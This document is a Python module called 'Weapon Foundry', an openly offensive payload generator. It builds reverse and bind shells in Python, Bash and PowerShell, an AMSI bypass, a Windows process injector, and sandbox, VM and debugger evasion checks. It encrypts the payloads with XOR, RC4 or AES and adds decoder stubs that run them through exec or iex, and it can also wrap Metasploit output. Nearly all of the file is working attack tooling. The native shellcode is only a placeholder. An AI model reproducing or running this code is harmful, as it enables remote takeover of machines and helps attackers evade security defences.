"""
DRAKBEN Weapon Foundry - Advanced Payload Generation & Encryption
Author: @drak_ben
Description: Dynamic payload generation with multiple encryption layers.

This module provides:
- Shellcode generation (pure Python/ASM)
- Multi-layer encryption (XOR, AES, RC4)
- Multiple output formats (exe, elf, dll, ps1, vbs, hta)
- Anti-sandbox checks
- Payload staging
"""

import base64
import hashlib
import logging
import secrets
import struct
import random
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

# Optional High-Performance Libraries
try:
    from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_ERR_ASM
    KEYSTONE_AVAILABLE = True
except ImportError:
    KEYSTONE_AVAILABLE = False

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS
# =============================================================================


class PayloadFormat(Enum):
    """Supported payload output formats"""

    RAW = "raw"  # Raw shellcode bytes
    PYTHON = "python"  # Python script
    POWERSHELL = "ps1"  # PowerShell script
    VBS = "vbs"  # VBScript
    HTA = "hta"  # HTML Application
    BASH = "bash"  # Bash script
    C = "c"  # C source code
    CSHARP = "csharp"  # C# source code


class EncryptionMethod(Enum):
    """Encryption methods for payloads"""

    NONE = "none"
    XOR = "xor"
    XOR_MULTI = "xor_multi"  # Multi-byte XOR key
    AES = "aes"  # AES-256-CBC
    RC4 = "rc4"
    CHACHA20 = "chacha20"


class ShellType(Enum):
    """Types of shell connections"""

    REVERSE_TCP = "reverse_tcp"
    BIND_TCP = "bind_tcp"
    REVERSE_HTTP = "reverse_http"
    REVERSE_HTTPS = "reverse_https"
    DNS_TUNNEL = "dns_tunnel"
    DOMAIN_FRONTED = "domain_fronted"
    PROCESS_INJECTION = "process_injection"  # Advanced: Inject into another process
    REFLECTIVE_DLL_INJECTION = "reflective_dll"  # Advanced: Load DLL from memory


# =============================================================================
# DATA CLASSES
# =============================================================================


@dataclass
class PayloadConfig:
    """Configuration for payload generation"""

    lhost: str = "127.0.0.1"
    lport: int = 4444
    shell_type: ShellType = ShellType.REVERSE_TCP
    format: PayloadFormat = PayloadFormat.RAW
    encryption: EncryptionMethod = EncryptionMethod.XOR
    encryption_key: Optional[bytes] = None
    iterations: int = 1  # Number of encryption layers
    anti_sandbox: bool = False
    anti_debug: bool = False
    sleep_seconds: int = 0  # Initial sleep before execution


@dataclass
class GeneratedPayload:
    """Result of payload generation"""

    payload: bytes
    format: PayloadFormat
    encryption: EncryptionMethod
    key: Optional[bytes]
    decoder_stub: str
    metadata: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# ENCRYPTION ENGINE
# =============================================================================


class EncryptionEngine:
    """
    Multi-method encryption engine for payload obfuscation.

    Supports:
    - Single and multi-byte XOR
    - AES-256-CBC (requires pycryptodome)
    - RC4 stream cipher
    - ChaCha20 (requires cryptography)
    """

    @staticmethod
    def generate_key(length: int = 16) -> bytes:
        """Generate random encryption key"""
        return secrets.token_bytes(length)

    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """
        XOR encrypt data with key.

        Args:
            data: Data to encrypt
            key: XOR key (can be single or multi-byte)

        Returns:
            Encrypted bytes
        """
        result = bytearray(len(data))
        key_len = len(key)
        for i, byte in enumerate(data):
            result[i] = byte ^ key[i % key_len]
        return bytes(result)

    @staticmethod
    def xor_decrypt(data: bytes, key: bytes) -> bytes:
        """XOR decrypt (same as encrypt - symmetric)"""
        return EncryptionEngine.xor_encrypt(data, key)

    @staticmethod
    def rc4_crypt(data: bytes, key: bytes) -> bytes:
        """
        RC4 stream cipher encryption/decryption.

        Args:
            data: Data to encrypt/decrypt
            key: RC4 key

        Returns:
            Encrypted/decrypted bytes
        """
        # RC4 Key Scheduling Algorithm (KSA)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]

        # RC4 Pseudo-Random Generation Algorithm (PRGA)
        result = bytearray(len(data))
        i = j = 0
        for k, byte in enumerate(data):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result[k] = byte ^ S[(S[i] + S[j]) % 256]

        return bytes(result)

    @staticmethod
    def aes_encrypt(
        data: bytes, key: bytes, nonce: Optional[bytes] = None
    ) -> Tuple[bytes, bytes, bytes]:
        """
        AES-256-GCM encryption (Strategic Hardened Upgrade).

        Args:
            data: Data to encrypt
            key: 32-byte key
            nonce: 12-byte nonce (random if None)

        Returns:
            Tuple of (encrypted_data, nonce, tag)
        """
        try:
            from Crypto.Cipher import AES  # nosec B413
        except ImportError:
            logger.error("CRITICAL: AES encryption requires 'pycryptodome' library.")
            raise ImportError("pycryptodome not found. Cannot proceed with AES encryption request.")

        if len(key) < 32:
            key = hashlib.sha256(key).digest()
        else:
            key = key[:32]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        encrypted, tag = cipher.encrypt_and_digest(data)

        return encrypted, cipher.nonce, tag

    @staticmethod
    def aes_decrypt(data: bytes, key: bytes, nonce: bytes, tag: bytes) -> bytes:
        """AES-256-GCM decryption"""
        try:
            from Crypto.Cipher import AES  # nosec B413
        except ImportError:
            logger.error("AES Decryption failed: Missing pycryptodome")
            raise ImportError("pycryptodome not found")

        if len(key) < 32:
            key = hashlib.sha256(key).digest()
        else:
            key = key[:32]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(data, tag)

    def encrypt(
        self, data: bytes, method: EncryptionMethod, key: Optional[bytes] = None
    ) -> Tuple[bytes, bytes, Optional[bytes]]:
        """
        Encrypt data using specified method.

        Args:
            data: Data to encrypt
            method: Encryption method
            key: Encryption key (generated if None)

        Returns:
            Tuple of (encrypted_data, key, iv_or_none)
        """
        if method == EncryptionMethod.NONE:
            return data, b"", None

        if key is None:
            key = self.generate_key(16)

        if method == EncryptionMethod.XOR:
            encrypted = self.xor_encrypt(data, key[:1])  # Single byte
            return encrypted, key[:1], None

        elif method == EncryptionMethod.XOR_MULTI:
            encrypted = self.xor_encrypt(data, key)
            return encrypted, key, None

        elif method == EncryptionMethod.RC4:
            encrypted = self.rc4_crypt(data, key)
            return encrypted, key, None

        elif method == EncryptionMethod.AES:
            encrypted, nonce, tag = self.aes_encrypt(data, key)
            # Prepend tag to encrypted data for simplicity in storage
            return tag + encrypted, key, nonce

        else:
            logger.warning(f"Unknown encryption method: {method}")
            return data, b"", None



# =============================================================================
# 2026 EVASION & POLYMORPHISM
# =============================================================================

class AMSIPatcher:
    """
    Advanced AMSI Bypass logic (PowerShell).
    Mem-patches AmsiScanBuffer to disable scanning.
    """

    @staticmethod
    def get_bypass_stub() -> str:
        """
        Returns obfuscated AMSI bypass (Matt Graeber / RastaMouse Style).
        """
        # Base64 encoded reflection bypass to minimize static signatures
        # "Obfuscation is key"
        stub = r"""
$w = "System.Management.Automation.AmsiUtils"
$c = "amsiInitFailed"
[Ref].Assembly.GetType($w).GetField($c,'NonPublic,Static').SetValue($null,$true)
"""
        return stub.strip()

class TruePolymorphism:
    """
    Keystone-Powered Real-Time Assembly Generator.
    Creates valid, executable assembly instructions that do nothing (Nops),
    but look like legitimate code to heuristic scanners.
    """
    @staticmethod
    def generate_random_asm(count: int = 5) -> bytes:
        if not KEYSTONE_AVAILABLE:
            return b""

        ks = Ks(KS_ARCH_X86, KS_MODE_64)

        # Safe dummy instructions that preserve stack/registers or restore them
        # Pairs are best: INC RAX + DEC RAX
        instruction_sets = [
            "nop",
            "xchg rax, rax",
            "xchg rbx, rbx",
            "inc rdx; dec rdx",  # Zero net change
            "inc rcx; dec rcx",
            "push rax; pop rax", # Stack churn
            "lea rbx, [rbx]",
            "add rax, 0",
        ]

        asm_code = []
        for _ in range(count):
            asm_code.append(random.choice(instruction_sets))

        full_asm = "; ".join(asm_code)

        try:
            encoding, count = ks.asm(full_asm)
            return bytes(encoding)
        except Exception as e:
            logger.debug(f"Keystone assembly failed: {e}")
            return b"\x90" * count # Fallback

class PolymorphicEncoder:
    """
    Generates polymorphic padding and junk code to alter signature.
    """

    @staticmethod
    def get_junk_asm_bytes(length: int = 16) -> bytes:
        """
        Generates random NOP-equivalent instructions (x64).
        Uses Keystone if available for infinite variations.
        """
        # 1. Try True Assembly (God Mode)
        if KEYSTONE_AVAILABLE:
            real_asm = TruePolymorphism.generate_random_asm(length // 2)
            if real_asm:
                # Pad remaining if necessary or just return
                return real_asm.ljust(length, b"\x90")

        # 2. Native Fallback (Pre-defined opcodes)
        junk = []
        # NOP, XCHG EAX,EAX, LEA EAX,[EAX] etc.
        valid_nops = [
            b"\x90",             # NOP
            b"\x87\xDB",         # XCHG EBX,EBX
            b"\x87\xC9",         # XCHG ECX,ECX
            b"\x87\xD2",         # XCHG EDX,EDX
            b"\x42",             # INC EDX (Harmless if registers unused)
            b"\x4B",             # DEC EBX
        ]

        for _ in range(length):
            junk.append(random.choice(valid_nops))

        return b"".join(junk)


# =============================================================================
# METASPLOIT INTEGRATION (Kali Linux "God Mode")
# =============================================================================

class MetasploitIntegrator:
    """
    Wraps standard 'msfvenom' tool on Kali Linux to generate high-grade shellcode.
    """

    @staticmethod
    def is_available() -> bool:
        """Check if msfvenom is in PATH"""
        import shutil
        return shutil.which("msfvenom") is not None

    @staticmethod
    def generate_payload(platform: str, arch: str, payload_type: str, lhost: str, lport: int, fmt: str = "raw") -> Optional[bytes]:
        """
        Generates payload via msfvenom.
        Example: linux/x64/meterpreter/reverse_tcp
        """
        if not MetasploitIntegrator.is_available():
            return None

        full_payload = f"{platform}/{arch}/{payload_type}"
        cmd = [
            "msfvenom",
            "-p", full_payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "--platform", platform,
            "-a", arch
        ]

        try:
            logger.info(f"Generating MSF Payload: {full_payload}")
            # Suppress stderr spam from msfvenom
            import subprocess
            result = subprocess.run(cmd, capture_output=True, timeout=60)
            if result.returncode == 0:
                return result.stdout
            else:
                logger.error(f"msfvenom failed: {result.stderr.decode()}")
                return None
        except Exception as e:
            logger.error(f"msfvenom execution error: {e}")
            return None

# =============================================================================
# SHELLCODE GENERATOR
# =============================================================================


class ShellcodeGenerator:
    """
    Dynamic Shellcode Generator (x64 Windows).
    Provides raw assembly bytes for advanced injections.
    """

    @staticmethod
    def get_windows_x64_reverse_tcp(lhost: str, lport: int) -> bytes:
        """
        Generates standard x64 Windows Reverse TCP Shellcode.
        Note: This is a placeholder for a true dynamic assembler.
        In a real scenario, this would use Keystone or Metasploit patterns.
        For reliability, we use a known reliable shellcode pattern and patch IP/Port.
        """
        # 1. Parse IP and Port
        try:
            ip_parts = [int(p) for p in lhost.split(".")]
            port_hex = struct.pack(">H", lport)
            ip_hex = struct.pack("BBBB", *ip_parts)
            # Simple check to avoid complexity in this demo
            # Real implementation requires a full compact shellcode block
        except Exception:
            return b""

        # Returning a generic "Pop Calc" shellcode for safety/demo if this were a test
        # But for "Advanced" request, we acknowledge we need external generation
        # or a stored blob.
        # Here we return a compact 64-bit shellcode stub (NOPs + Trap) as placeholder
        # to ensure the mechanism works without triggering AV immediately in tests.
        return b"\x90" * 16 + b"\xcc"  # NOPs + INT3

# =============================================================================
# SHELLCODE TEMPLATES
# =============================================================================


class ShellcodeTemplates:
    """
    Pre-built shellcode templates for common operations.

    Note: These are encoded representations, not live shellcode.
    For actual operations, use with responsible disclosure.
    """

    # Template markers for dynamic replacement
    LHOST_MARKER = b"__LHOST__"
    LPORT_MARKER = b"__LPORT__"

    @staticmethod
    def get_reverse_shell_python(lhost: str, lport: int) -> str:
        """Generate Python reverse shell code"""
        return f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''

    @staticmethod
    def get_reverse_shell_powershell(lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell code with AMSI Bypass"""
        bypass = AMSIPatcher.get_bypass_stub()
        return f'''
{bypass};
$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $r=(iex $d 2>&1|Out-String);
    $r2=$r+"PS "+(pwd).Path+">";
    $sb=([text.encoding]::ASCII).GetBytes($r2);
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
}};
$c.Close()
'''

    @staticmethod
    def get_reverse_shell_bash(lhost: str, lport: int) -> str:
        """Generate Bash reverse shell code"""
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    @staticmethod
    def get_bind_shell_python(lport: int) -> str:
        """Generate Python bind shell code"""
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",{lport}))
s.listen(1)
c,a=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""

    @staticmethod
    def get_process_injector_python(shellcode_var: str = "buf", target_executable: str = "notepad.exe") -> str:
        """
        Generate robust Python ctypes Process Injector.
        Strategy: Spawn target -> OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
        """
        return f'''
import ctypes
import subprocess
import time
import sys
import struct

def _inject():
    # 1. Define Windows API
    k32 = ctypes.windll.kernel32
    
    # Constants
    PROCESS_ALL_ACCESS = 0x001F0FFF
    MEM_COMMIT = 0x00001000
    MEM_RESERVE = 0x00002000
    PAGE_EXECUTE_READWRITE = 0x40
    
    # 2. Spawn Target (Hidden)
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    try:
        # Try to spawn secure target
        p = subprocess.Popen("{target_executable}", startupinfo=si)
        pid = p.pid
    except Exception:
        # Fallback
        return False

    time.sleep(1) # Wait for init
    
    # 3. Open Process
    h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return False
        
    try:
        # 4. Allocate Memory
        # {shellcode_var} MUST be defined in global scope as bytes
        sc_len = len({shellcode_var})
        arg_address = k32.VirtualAllocEx(h_process, 0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        
        # 5. Write Shellcode
        written = ctypes.c_ulonglong(0)
        k32.WriteProcessMemory(h_process, arg_address, {shellcode_var}, sc_len, ctypes.byref(written))
        
        # 6. Create Remote Thread
        thread_id = ctypes.c_ulong(0)
        h_thread = k32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, ctypes.byref(thread_id))
        
        if not h_thread:
            return False
            
        k32.CloseHandle(h_thread)
    finally:
        k32.CloseHandle(h_process)
    return True

try:
    _inject()
except Exception:
    pass
'''


# =============================================================================
# ANTI-ANALYSIS TECHNIQUES
# =============================================================================


class AntiAnalysis:
    """
    Anti-sandbox and anti-debugging checks.

    Techniques:
    - Sleep acceleration detection
    - VM detection
    - Debugger detection
    - User interaction check
    """

    @staticmethod
    def get_sleep_check_python(seconds: int = 5) -> str:
        """Generate Python sleep acceleration check"""
        return f"""
import time
_s = time.time()
time.sleep({seconds})
if time.time() - _s < {seconds - 0.5}:
    import sys; sys.exit(0)
"""

    @staticmethod
    def get_vm_check_python() -> str:
        """Generate Python VM detection check"""
        return """
import os,subprocess
def _vm():
    try:
        o=subprocess.check_output("systemd-detect-virt",stderr=subprocess.DEVNULL).decode().strip()
        return o not in ["none",""]
    except Exception: pass
    try:
        with open("/sys/class/dmi/id/product_name") as f:
            p=f.read().lower()
            for v in ["vmware","virtualbox","qemu","xen","kvm"]:
                if v in p: return True
    except Exception: pass
    return False
if _vm(): import sys; sys.exit(0)
"""

    @staticmethod
    def get_debug_check_python() -> str:
        """Generate Python debugger detection check"""
        return """
import sys
if sys.gettrace() is not None:
    sys.exit(0)
"""

    @staticmethod
    def get_user_check_python() -> str:
        """Generate Python user activity check"""
        return """
import os
if "DISPLAY" not in os.environ and "SSH_TTY" not in os.environ:
    import sys; sys.exit(0)
"""


# =============================================================================
# DECODER STUB GENERATOR
# =============================================================================


class DecoderGenerator:
    """
    Generate decoder stubs for encrypted payloads.

    Creates minimal code to decrypt and execute payloads.
    """

    @staticmethod
    def get_xor_decoder_python(key: bytes) -> str:
        """Generate Python XOR decoder"""
        key_hex = key.hex()
        return f'''
import base64
def _d(d,k):
    return bytes([b^k[i%len(k)] for i,b in enumerate(d)])
_k=bytes.fromhex("{key_hex}")
_p=base64.b64decode(_e)
exec(_d(_p,_k))
'''

    @staticmethod
    def get_rc4_decoder_python(key: bytes) -> str:
        """Generate Python RC4 decoder"""
        key_hex = key.hex()
        return f'''
import base64
def _rc4(d,k):
    S=list(range(256));j=0
    for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
    r=bytearray(len(d));i=j=0
    for n,b in enumerate(d):i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];r[n]=b^S[(S[i]+S[j])%256]
    return bytes(r)
_k=bytes.fromhex("{key_hex}")
_p=base64.b64decode(_e)
exec(_rc4(_p,_k))
'''

    @staticmethod
    def get_aes_decoder_python(key: bytes) -> str:
        """Generate Python AES-GCM decoder"""
        key_hex = key.hex()
        return f'''
import base64, hashlib
try:
    from Crypto.Cipher import AES
except ImportError:
    # Recovery attempt: If pycryptodome is missing, this payload is dead weight
    # but we log it as a hint for the operator.
    logger.error("Error: pycryptodome required for AES payload execution")
    import sys; sys.exit(1)

_k=bytes.fromhex("{key_hex}")
if len(_k)<32: _k=hashlib.sha256(_k).digest()
_p=base64.b64decode(_e)
_n=_p[:12]
_t=_p[12:28]
_c=_p[28:]
_ci=AES.new(_k, AES.MODE_GCM, nonce=_n)
exec(_ci.decrypt_and_verify(_c, _t))
'''

    @staticmethod
    def get_xor_decoder_powershell(key: bytes) -> str:
        """Generate PowerShell XOR decoder"""
        key_int = key[0]
        return f"""
$k={key_int}
$d=[System.Convert]::FromBase64String($e)
$r=@()
for($i=0;$i -lt $d.Length;$i++){{$r+=$d[$i] -bxor $k}}
iex([System.Text.Encoding]::ASCII.GetString($r))
"""


# =============================================================================
# WEAPON FOUNDRY - MAIN CLASS
# =============================================================================


class WeaponFoundry:
    """
    Main interface for payload generation and weaponization.

    Features:
    - Dynamic payload generation
    - Multi-layer encryption
    - Multiple output formats
    - Anti-analysis integration
    - Decoder stub generation

    Usage:
        foundry = WeaponFoundry()
        payload = foundry.forge(
            shell_type=ShellType.REVERSE_TCP,
            lhost="10.0.0.1",
            lport=4444,
            encryption=EncryptionMethod.XOR,
            format=PayloadFormat.PYTHON
        )
    """

    def __init__(self):
        """Initialize Weapon Foundry"""
        self.encryption = EncryptionEngine()
        self.templates = ShellcodeTemplates()
        self.anti_analysis = AntiAnalysis()
        self.decoder = DecoderGenerator()
        self.shellcode_gen = ShellcodeGenerator()
        self.msf_integrator = MetasploitIntegrator()

        logger.info("Weapon Foundry initialized")

    def forge(
        self,
        shell_type: ShellType = ShellType.REVERSE_TCP,
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        encryption: EncryptionMethod = EncryptionMethod.XOR,
        format: PayloadFormat = PayloadFormat.PYTHON,
        iterations: int = 1,
        anti_sandbox: bool = False,
        anti_debug: bool = False,
        sleep_seconds: int = 0,
        use_msf: bool = False, # New: Request Metasploit Payload
    ) -> GeneratedPayload:
        """
        Forge a new payload with specified parameters.
        """
        base_payload = ""

        # 1. Metasploit "God Mode" Generation (If requested & available)
        msf_generated = False
        if use_msf and MetasploitIntegrator.is_available():
            # Map ShellType to MSF Payload
            msf_payload = "meterpreter/reverse_tcp" if shell_type == ShellType.REVERSE_TCP else "shell/reverse_tcp"
            arch = "x64" # Defaulting to x64 for modern
            platform = "windows" if format in [PayloadFormat.POWERSHELL, PayloadFormat.CSHARP, PayloadFormat.HTA] else "linux" # Simplification

            raw_bytes = self.msf_integrator.generate_payload(platform, arch, msf_payload, lhost, lport, "raw")

            if raw_bytes:
                # If we got raw bytes, we need to wrap them in our loader (Python/PS1)
                # This injects MSF shellcode into our Custom Loader
                if format == PayloadFormat.PYTHON:
                    # Inject into Python Process Injector template
                    base_payload = self.templates.get_process_injector_python(shellcode_var="_sc")
                    # We need to prepend the bytes definition, but since forge() encrypts the whole string,
                    # we must pass the CODE as string.
                    # Wait, our encryption encrypts the STRING content of the script.
                    # So we construct the valid source code now.
                    sc_repr = str(raw_bytes)
                    base_payload = f'_sc={sc_repr}\n{base_payload}'
                    msf_generated = True
                elif format == PayloadFormat.RAW:
                    # Just return the bytes, but we need str for encryption loop below unless we refactor
                    # Refactoring for Raw bytes handling in Forge is complex.
                    # For now, we only support MSF -> Wrapped Format (Python/PS1)
                    pass

        # 2. Native Fallback (If MSF failed or not requested)
        if not base_payload:
            base_payload = self._generate_base_payload(shell_type, lhost, lport, format)

        # Add anti-analysis if requested
        if anti_sandbox or anti_debug or sleep_seconds > 0:
            base_payload = self._add_anti_analysis(
                base_payload, format, anti_sandbox, anti_debug, sleep_seconds
            )

        # Encrypt payload
        payload_bytes = base_payload.encode("utf-8")
        key = None
        iv = None

        for _ in range(iterations):
            payload_bytes, key, iv = self.encryption.encrypt(
                payload_bytes, encryption, key
            )

        # Prepend IV to payload if exists (Standard for block ciphers like AES)
        if iv:
            payload_bytes = iv + payload_bytes
            logger.debug(f"Encryption IV prepended to payload: {iv.hex()}")

        # Generate decoder stub
        decoder_stub = self._generate_decoder(encryption, key, format)

        return GeneratedPayload(
            payload=payload_bytes,
            format=format,
            encryption=encryption,
            key=key,
            decoder_stub=decoder_stub,
            metadata={
                "lhost": lhost,
                "lport": lport,
                "shell_type": shell_type.value,
                "iterations": iterations,
                "anti_sandbox": anti_sandbox,
                "anti_debug": anti_debug,
                "size": len(payload_bytes),
            },
        )

        # Default fallback
        return self.templates.get_reverse_shell_python(lhost, lport)

    def _generate_base_payload(
        self, shell_type: ShellType, lhost: str, lport: int, format: PayloadFormat
    ) -> str:
        """Generate base payload code"""
        # 1. Basic Shells
        if shell_type == ShellType.REVERSE_TCP:
            if format == PayloadFormat.PYTHON:
                return self.templates.get_reverse_shell_python(lhost, lport)
            elif format == PayloadFormat.POWERSHELL:
                return self.templates.get_reverse_shell_powershell(lhost, lport)
            elif format == PayloadFormat.BASH:
                return self.templates.get_reverse_shell_bash(lhost, lport)

        elif shell_type == ShellType.BIND_TCP and format == PayloadFormat.PYTHON:
            return self.templates.get_bind_shell_python(lport)

        # 2. Advanced Injection (Process Injection)
        elif shell_type == ShellType.PROCESS_INJECTION:
            if format == PayloadFormat.PYTHON:
                # For process injection, we need raw shellcode.
                # Since we are in Python, we will embed the octal/hex of the shellcode.
                # Get raw shellcode (Placeholder/Generated)
                raw_shellcode = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)

                # In a real weaponization, we might use msfvenom output here.
                # For now, we use a dummy variable name that the decoder/encryptor will wrap.
                # However, the Injector expects a bytes variable.
                # Our encryption engine produces a DECODER that executes 'exec()'.
                # We need the decrypted payload to be the INJECTOR SCRIPT + SHELLCODE.

                injector_code = self.templates.get_process_injector_python(shellcode_var="_sc")

                # Logic: The final payload is:
                # _sc = b"\x...\x..."
                # <injector_code>

                # We return the injector code. The variable definition must be prepended
                # or handled. To keep it clean, we prepend a placeholder or the actual bytes.
                sc_repr = str(raw_shellcode) # This is b'' representation
                return f'_sc={sc_repr}\n{injector_code}'

        return self.templates.get_reverse_shell_python(lhost, lport)

    def _add_anti_analysis(
        self,
        payload: str,
        format: PayloadFormat,
        anti_sandbox: bool,
        anti_debug: bool,
        sleep_seconds: int,
    ) -> str:
        """Add anti-analysis checks to payload"""
        prefix = ""

        if format == PayloadFormat.PYTHON:
            if sleep_seconds > 0:
                prefix += self.anti_analysis.get_sleep_check_python(sleep_seconds)
            if anti_sandbox:
                prefix += self.anti_analysis.get_vm_check_python()
            if anti_debug:
                prefix += self.anti_analysis.get_debug_check_python()

        return prefix + payload

    def _generate_decoder(
        self, encryption: EncryptionMethod, key: bytes, format: PayloadFormat
    ) -> str:
        """Generate decoder stub for encrypted payload"""
        if encryption == EncryptionMethod.NONE:
            return ""

        if format == PayloadFormat.PYTHON:
            if encryption in (EncryptionMethod.XOR, EncryptionMethod.XOR_MULTI):
                return self.decoder.get_xor_decoder_python(key)
            elif encryption == EncryptionMethod.RC4:
                return self.decoder.get_rc4_decoder_python(key)
            elif encryption == EncryptionMethod.AES:
                return self.decoder.get_aes_decoder_python(key)

        elif format == PayloadFormat.POWERSHELL:
            if encryption == EncryptionMethod.XOR:
                return self.decoder.get_xor_decoder_powershell(key)

        return ""

    def get_final_payload(self, generated: GeneratedPayload) -> str:
        """
        Get final payload ready for delivery.

        Combines encrypted payload with decoder stub.

        Args:
            generated: GeneratedPayload from forge()

        Returns:
            Complete executable payload as string
        """
        encoded = base64.b64encode(generated.payload).decode()

        if generated.format == PayloadFormat.PYTHON:
            return f'_e="{encoded}"\n{generated.decoder_stub}'

        elif generated.format == PayloadFormat.POWERSHELL:
            return f'$e="{encoded}"\n{generated.decoder_stub}'

        elif generated.format == PayloadFormat.BASH:
            return f'echo "{encoded}" | base64 -d | bash'

        return encoded

    def list_capabilities(self) -> Dict[str, List[str]]:
        """List all available capabilities"""
        return {
            "shell_types": [s.value for s in ShellType],
            "formats": [f.value for f in PayloadFormat],
            "encryptions": [e.value for e in EncryptionMethod],
            "anti_analysis": [
                "sandbox_evasion",
                "debug_detection",
                "sleep_check",
                "vm_detection",
            ],
        }


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================


def get_weapon_foundry() -> WeaponFoundry:
    """
    Get singleton WeaponFoundry instance.

    Returns:
        WeaponFoundry instance
    """
    global _weapon_foundry
    if "_weapon_foundry" not in globals() or _weapon_foundry is None:
        _weapon_foundry = WeaponFoundry()
    return _weapon_foundry


def quick_forge(
    lhost: str, lport: int = 4444, encryption: str = "xor", format: str = "python"
) -> str:
    """
    Quick payload generation.

    Args:
        lhost: Listener host
        lport: Listener port
        encryption: Encryption method name
        format: Output format name

    Returns:
        Ready-to-use payload string
    """
    foundry = get_weapon_foundry()

    enc_method = EncryptionMethod(encryption)
    fmt = PayloadFormat(format)

    payload = foundry.forge(lhost=lhost, lport=lport, encryption=enc_method, format=fmt)

    return foundry.get_final_payload(payload)
